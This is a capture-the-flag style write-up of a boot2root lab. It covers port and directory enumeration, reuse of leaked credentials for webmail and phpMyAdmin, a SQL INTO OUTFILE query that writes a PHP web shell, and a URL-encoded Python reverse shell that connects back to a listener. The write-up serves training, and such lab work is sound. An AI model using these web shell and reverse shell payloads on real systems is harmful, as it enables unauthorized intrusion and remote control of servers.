## 1. Enumerate Open Ports

First, we start by scanning the target's open ports using **Nmap**.

```bash
xel@lucky7 ~/files/42/boot2root % nmap 192.168.0.31

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 12:35 CEST
Nmap scan report for 192.168.0.31
Host is up (0.00066s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds
```

We identify that ports 21 (FTP), 22 (SSH), 80 (HTTP), 143 (IMAP), 443 (HTTPS), and 993 (IMAPS) are open. 

## 2. Perform a Full Version Scan

We now run a full **Nmap** scan with service detection and versioning to get detailed information about each open port.

```bash
xel@lucky7 ~/files/42/boot2root % nmap -T4 -sVC -A -p 21,22,80,143,443,993 192.168.0.31

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 12:36 CEST
Nmap scan report for hackme.fr (192.168.0.31)
Host is up (0.00028s latency).

PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hack me if you can
143/tcp open  imap       Dovecot imapd
|_ssl-date: 2024-10-03T10:36:52+00:00; 0s from scanner time.
|_imap-capabilities: more ENABLE have listed IDLE ID post-login SASL-IR capabilities STARTTLS IMAP4rev1 Pre-login OK LITERAL+ LOGIN-REFERRALS LOGINDISABLEDA0001
443/tcp open  ssl/http   Apache httpd 2.2.22
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2024-10-03T10:36:52+00:00; 0s from scanner time.
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
993/tcp open  ssl/imaps?
|_ssl-date: 2024-10-03T10:36:52+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From this scan, we see that:
- FTP (vsftpd 2.0.8 or later) is running on port 21.
- SSH (OpenSSH 5.9p1) is on port 22.
- HTTP and HTTPS are served by Apache 2.2.22 (Ubuntu) on ports 80 and 443, respectively.
- IMAP and IMAPS services are handled by Dovecot.

## 3. Directory Fuzzing with FFUF

### HTTP Enumeration

We use **ffuf** to brute-force directories on the HTTP service (port 80):

```bash
xel@lucky7 ~/files/42/boot2root % ffuf -u http://192.168.0.31/FUZZ -w ~/files/pentest/directory-list-medium

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.31/FUZZ
 :: Wordlist         : FUZZ: /home/xel/files/pentest/directory-list-medium
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

forum                   [Status: 403, Size: 314, Words: 20, Lines: 10, Duration: 0ms]
fonts                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 0ms]
server-status           [Status: 403, Size: 294, Words: 21, Lines: 11, Duration: 2ms]
```

Here, we discovered:
- A **/forum** directory, but it is restricted (403 Forbidden).
- A **/fonts** directory, which redirects (301) elsewhere.
- The **/server-status** endpoint is also forbidden (403).

### HTTPS Enumeration

We repeat the process for the HTTPS service (port 443):

```bash
xel@lucky7 ~/files/42/boot2root % ffuf -u https://192.168.0.31/FUZZ -w ~/files/pentest/directory-list-medium

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://192.168.0.31/FUZZ
 :: Wordlist         : FUZZ: /home/xel/files/pentest/directory-list-medium
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

forum                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 0ms]
webmail                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms]
phpmyadmin              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 5ms]
server-status           [Status: 403, Size: 294, Words: 21, Lines: 11, Duration: 2ms]
```

For HTTPS, we find:
- A **/forum** directory, which redirects (301).
- A **/webmail** directory, likely for accessing the mail service.
- A **/phpmyadmin** directory, which could provide access to the database management system (MySQL).

## 4. Web browsing

### Forum
Let's start by exploring the **/forum** directory. While browsing the forum, we notice that the user **lmezard** leaks their password: `!q\]Ej?*5K5cy*AJ`. We attempt to log in with their credentials, and it works.

In their user profile, we find their email: **laurie@borntosec.net**. Aside from this, there doesn't seem to be anything else of interest in the forum.

### Webmail
Navigating to the **/webmail** directory, we are presented with a login interface. We decide to try **lmezard's** email (`laurie@borntosec.net`) and the leaked password, and bingo, it works! 

We found this mail:
```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

### Database

In the **phpMyAdmin** interface, we find a database containing a table named **userdata**, which holds the forum users and their passwords. Among the users, there is an **admin** account with the following password hash: 

`ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0516d551c28`.

### Crack the Admin Password

Upon examining the forum's source code, we discover that the forum was created using a PHP framework called **mylittleforum** version 2.3.4, which fortunately is open-source.

We look at the source code to find the password hashing algorithm, and here’s what we find:

```php
function generate_pw_hash($pw)
{
  $salt = random_string(10,'0123456789abcdef');
  $salted_hash = sha1($pw.$salt);
  $hash_with_salt = $salted_hash.$salt;
  return $hash_with_salt;
}
```

The password is hashed with a salt, making it practically uncrackable due to the random string appended to the hash.

## 5. SQL

However, having access to **phpMyAdmin** allows us to execute arbitrary SQL code. We can potentially use this to upload a PHP file that will execute commands on the server.

We try creating a PHP file that can be accessed from the browser and executed. After testing various accessible directories (`/images`, `/themes`, `/includes/`), we find that only the `/templates_c/` directory works.

We run the following SQL query to upload a PHP script into the directory:

```sql
SELECT "<?php system('id'); ?>" INTO OUTFILE '/var/www/forum/templates_c/id.php';
```

Once the file is created, we access it through the browser and successfully execute the **id** command:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms that we are now running commands as the **www-data** user, which opens up further possibilities for privilege escalation.

## 6. Get a Reverse Shell

### Setting up a webshell

Now, let's set up a **web shell** to gain more control over the target system. We will modify our SQL query to create a simple PHP web shell that can execute system commands:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/forum/templates_c/webshell.php';
```

We can now access this web shell by using `curl` to send commands to it:

```bash
xel@lucky7 ~/files/42/boot2root % curl --insecure 'https://192.168.0.31/forum/templates_c/webshell.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms that our web shell is working and executing commands as the **www-data** user.

### Setting Up a Reverse Shell

Next, we set up a listener on our host machine to catch the reverse shell:

```bash
xel@lucky7 ~/files/42/boot2root % nc -lvnp 4444
Listening on 0.0.0.0 4444
```

To establish a reverse shell on the target, we take a Python reverse shell script from the **[Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python)**. We encode the payload using **CyberChef** with URL encoding, resulting in the following command:

```bash
xel@lucky7 ~/files/42/boot2root % curl --insecure 'https://192.168.0.31/forum/templates_c/webshell.php?cmd=export%20RHOST%3D%22192%2E168%2E0%2E24%22%3Bexport%20RPORT%3D4444%3Bpython%20%2Dc%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket%2Esocket%28%29%3Bs%2Econnect%28%28os%2Egetenv%28%22RHOST%22%29%2Cint%28os%2Egetenv%28%22RPORT%22%29%29%29%29%3B%5Bos%2Edup2%28s%2Efileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty%2Espawn%28%22%2Fbin%2Fsh%22%29%27'
```

Now, when the reverse shell connects, we receive a connection on our listener:

```bash
xel@lucky7 ~/files/42/boot2root % nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.0.31 50782
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

We now have a reverse shell running as the **www-data** user, giving us command execution on the target system.